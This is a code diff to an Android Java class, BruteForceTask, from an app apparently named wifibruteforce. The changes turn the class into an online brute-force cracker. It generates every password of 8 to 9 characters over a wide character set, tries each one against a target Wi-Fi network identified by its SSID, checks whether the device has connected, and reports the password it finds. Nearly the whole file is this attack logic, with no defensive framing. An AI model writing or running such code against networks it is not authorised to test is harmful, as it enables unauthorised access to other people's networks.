@@ -1,37 +1,47 @@
 package com.nguyen.wifibruteforce;
 
 import android.app.Activity;
-import android.app.ProgressDialog;
 import android.content.Context;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
-import android.net.wifi.WifiInfo;
-import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
 import android.util.Log;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import java.util.ArrayList;
-
-import static android.content.Context.WIFI_SERVICE;
 
 public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
+
+    //    private final char[] charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".toCharArray();
+    private final char[] charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\\:;\"'<>,.?/ ".toCharArray();
+
+    private int lengthMin;
+    private int lengthMax;
+
     private Activity activity;
     private String foundPass;
-    private ArrayList<String> arrPass;
-
-    public ArrayList<String> getArrPass() {
-        return arrPass;
-    }
-
-    public void setArrPass(ArrayList<String> arrPass) {
-        this.arrPass = arrPass;
-    }
 
     public BruteForceTask(Activity activity) {
         this.activity = activity;
 
+        setLengthMin(8);
+        setLengthMax(9);    //TODO: user can set
+    }
+
+    public int getLengthMin() {
+        return lengthMin;
+    }
+
+    public void setLengthMin(int lengthMin) {
+        this.lengthMin = lengthMin;
+    }
+
+    public int getLengthMax() {
+        return lengthMax;
+    }
+
+    public void setLengthMax(int lengthMax) {
+        this.lengthMax = lengthMax;
     }
 
     @Override
@@ -41,40 +51,65 @@ public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
 
     @Override
     protected Integer doInBackground(String... strings) {
-
-        FindPassword bruteforce = new FindPassword();
-        arrPass = bruteforce.arrBFTemp;
+        //strings[0]: ssid
         int count = 1;
-        for (int length = bruteforce.min; length < bruteforce.max; length++) { // Change bruteforce.min and bruteforce.max for number of characters to bruteforce.
-            //bruteforce.generate("", 0, length); //prepend_string, pos, length
-            bruteforce.generate("acbb", 0, length); //prepend_string, pos, length
-        }
-        for (String testPass : arrPass) {
-            Utils.finallyConnect(testPass, strings[0], activity);
-            Log.d("running", testPass);
+        String check = "";
+        String check1 = "";
+        String testPass;
 
-            publishProgress(count);
+        outerloop:      //set label for loop (break [label]; - break the labeled loop)
+        for (int length = getLengthMin(); length <= getLengthMax(); length++) {
+            final double NUMBER_OF_PERMUTATIONS = Math.pow(charset.length, length);
 
-            if (isCancelled()) {
-                Log.d("running", "isCancelled_BF");
-                break;
+            char[] pass = new char[length];
+//            Arrays.fill(temp, 'a');
+
+            for (int i = 0; i < NUMBER_OF_PERMUTATIONS; i++) {
+                int n = i;
+                for (int k = 0; k < length; k++) {
+                    pass[k] = charset[n % charset.length];
+                    testPass = String.valueOf(pass);
+                    n /= charset.length;
+                    if (!testPass.contains("\u0000") &&     // "\u0000" is default value of a char but ("\u0000" == null) return false
+                            !check1.equals(testPass) &&
+                            !check.equals(testPass)) {
+
+//                        System.out.println(testPass);   //output string
+
+                        Utils.finallyConnect(testPass, strings[0], activity);
+                        Log.d("running", testPass);
+
+                        publishProgress(count);
+                        count += 1;
+
+                        if (isCancelled()) {
+                            Log.d("running", "isCancelled_BF");
+                            break outerloop;
+                        }
+                        try {
+                            Thread.sleep(9000);
+                        } catch (InterruptedException e) {
+                            e.printStackTrace();
+                        }
+
+                        ConnectivityManager cm = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
+                        assert cm != null;
+                        NetworkInfo ni = cm.getActiveNetworkInfo();
+                        if (Utils.isConnectAccessPoint(activity.getApplicationContext())
+                                && Utils.convertSSID(ni.getExtraInfo()).equals(strings[0])) {
+                            Log.d("running", Utils.convertSSID(ni.getExtraInfo()) + "/" + strings[0] + "/pass: " + testPass);
+                            foundPass = testPass;
+//                Log.d("running", "pass for Toast: " + foundPass);
+                            break outerloop;
+                        }
+                    }
+                    //check duplicate values
+                    if (pass[0] == charset[0]) {
+                        check1 = testPass;
+                    }
+                    check = testPass;
+                }
             }
-            try {
-                Thread.sleep(100);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-//            ConnectivityManager cm = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
-//            assert cm != null;
-//            NetworkInfo ni = cm.getActiveNetworkInfo();
-//            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
-//                    && Utils.convertSSID(ni.getExtraInfo()).equals(strings[0])) {
-//                Log.d("running", Utils.convertSSID(ni.getExtraInfo()) + "/" + strings[0] + "/pass: " + testPass);
-//                foundPass = testPass;
-////                Log.d("running", "pass for Toast: " + foundPass);
-//                break;
-//            }
-            count += 1;
         }
         return null;
     }
@@ -82,7 +117,6 @@ public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
     @Override
     protected void onProgressUpdate(Integer... values) {
         super.onProgressUpdate(values);
-//        progressDialog.setProgress(values[0]);
         TextView txtPassCout = activity.findViewById(R.id.txtPassCount);
         txtPassCout.setText(values[0] + "");
     }
@@ -91,9 +125,7 @@ public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
     @Override
     protected void onPostExecute(Integer integer) {
         super.onPostExecute(integer);
-//        progressDialog.dismiss();
-        Log.d("running", "out");
-        Toast.makeText(activity.getApplicationContext(), R.string.pass_found + foundPass, Toast.LENGTH_LONG).show();
+        Toast.makeText(activity.getApplicationContext(), activity.getString(R.string.pass_found) + foundPass, Toast.LENGTH_LONG).show();
         activity.finish();
     }
 }
